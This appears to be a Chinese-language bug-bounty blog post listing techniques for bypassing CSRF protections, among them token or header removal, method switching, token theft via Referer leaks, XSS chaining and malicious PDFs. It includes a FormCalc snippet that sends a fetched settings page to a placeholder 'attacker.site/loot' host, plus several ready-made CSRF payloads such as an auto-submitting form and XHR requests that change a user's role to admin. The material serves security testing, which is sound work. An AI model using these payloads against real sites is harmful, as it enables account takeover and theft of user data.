
我的twitter @C1h2e11每天固定转载优质文章和思路，欢迎关注！
#	 起因
我最近在研究国外的各种新思路，最近看到了一篇CSRF的相关文章，只是写了各种Poc，我在写之前查找了大量的案例，这也就是为什么说技术分享的受益最大永远都是分享者，在这些案例里面我发现大多都是没有CSRF token或者其他防护机制的，同样的我查找了很多文章关于CSRF攻击，也并没有找到我想要的，于是就有了今天的文章


# CSRF Protection?
我们在漏洞挖掘过程中不难看出，很多时候我们会遇到各种CSRF的防护机制，随便一个网站都有token或者其他的防护机制。下面我们需要了解一下常见的防护方法
-	CSRF token
-	Referer Based Protection
-	XRSF Header
-	verify code
-	Seesions timeout
-	Double Password
....



# Bypass
我尽力寻找了各种案例和bypass思路，文后会有我看过的文章链接

---
删！
这个思路再很多时候都适用，面对`Referer` `XRSF Header` `token`都可以对其进行删除
这里我们用一个案例来说明
`http://infosecflash.com/2019/01/05/how-i-could-have-taken-over-any-pinterest-account/`
写文的日子是`2019-1-8`这个write up是前天的漏洞，删除了`XRSF Header`

---
改！
这个思路我是在medium上看见的
`https://medium.com/@Skylinearafat/a-very-useful-technique-to-bypass-the-csrf-protection-for-fun-and-profit-471af64da276`
修改了请求方式GET改成了POST 同样的漏洞挖也挖到过一次，我先修改了请求方式，并把POST的参数通过GET传入，但是也成功完成了CSRF攻击
如果你观察的仔细的话你可以看出
`http://infosecflash.com/2019/01/05/how-i-could-have-taken-over-any-pinterest-account/`这个案例删除了`XRSF Header`但是没有成功还是需要修改POST为GET

---
盗token！
尝试从其他渠道获得CSRF token
`http://www.anquan.us/static/bugs/wooyun-2015-090935.html`
利用了Referer泄露获取CSRF token 再利用CSRF token进行CSRF攻击

---
Use Bad PDF
`get() and post() methods of FormCalc allow to ex-filtrate CSRF-token`
这是我在twitter找到的一个文档上的原文
其实就是我们的PDF被浏览器解析，因为插件的原因可以进行请求，我们上传恶意的PDF文件在目标网站这样可以绕过referer甚至CSRF token ，这个漏洞和去年(2018)阿里的Chrome支持的PDF跳转是类似的。
我们只需要制作恶意的PDF文件，在里面插入我们的恶意代码
```html
<script contentType='application/x-formcalc'>
var content = GET("https://example.com/Settings.action"); Post("http://attacker.site/loot",content,"text/plain");
</script>
```
没错Poc是抄的，原地址
`https://speakerd.s3.amazonaws.com/presentations/05f698063d87416ba0ec312d0948799b/ZeroNights_2017.pdf`
这是一个CSRF bypass的PPT本文的一些思路也取自这里

---
改Cookie！
有些时候我们会遇到哪种可以修改cookie的漏洞
比如`CLRF`等，我们可以利用这些漏洞打组合拳进行CSRF攻击

---
组合拳！
XSS+CSRF
可以利用XSS漏洞进行直接的请求饶过Referer限制
也可以利用XSS盗取CSRF token 从而进行CSRF漏洞利用

---

# 浓缩
我在寻找更多bypass手段的时候我找到了这个调查
![PIC](http://c1h2e1.oss-cn-qingdao.aliyuncs.com/image/CSRF/CSRF1.png)
![PIC](http://c1h2e1.oss-cn-qingdao.aliyuncs.com/image/CSRF/CSRF2.png)
那么我们真正在实战中用到比较多的就是

-	删除CSRF token
-	置空token参数
-	修改请求方法
-	与token相同长度的任意字符串替换token
-	固定token
我相信看到这里各位已经心领神会了

---





# 关于提交方式
```html
<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
```
```html
<img src="http://www.example.com/api/setusername?username=CSRFd">
```
```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
```
```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST"&>
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
<script>
 document.getElementById("autosubmit").submit();
</script>
```
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.send('{"role":admin}');
</script>
```

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

#	参考链接
```
https://medium.com/@Skylinearafat/a-very-useful-technique-to-bypass-the-csrf-protection-for-fun-and-profit-471af64da276
https://medium.com/@iaincollins/csrf-tokens-via-ajax-a885c7305d4a
https://medium.com/@arbazhussain/stealing-access-token-of-one-drive-integration-by-chaining-csrf-vulnerability-779f999624a7
https://medium.com/bugbountywriteup/content-negotiation-with-csrf-969e639d6a1a
https://medium.com/rubyinside/a-deep-dive-into-csrf-protection-in-rails-19fa0a42c0ef
https://speakerd.s3.amazonaws.com/presentations/05f698063d87416ba0ec312d0948799b/ZeroNights_2017.pdf
Check out @detectify’s Tweet: https://twitter.com/detectify/status/1081520785322332166?s=09
http://infosecflash.com/2019/01/05/how-i-could-have-taken-over-any-pinterest-account/
https://github.com/TheRook/CSRF-Request-Builder
```

#	反思
沉淀!
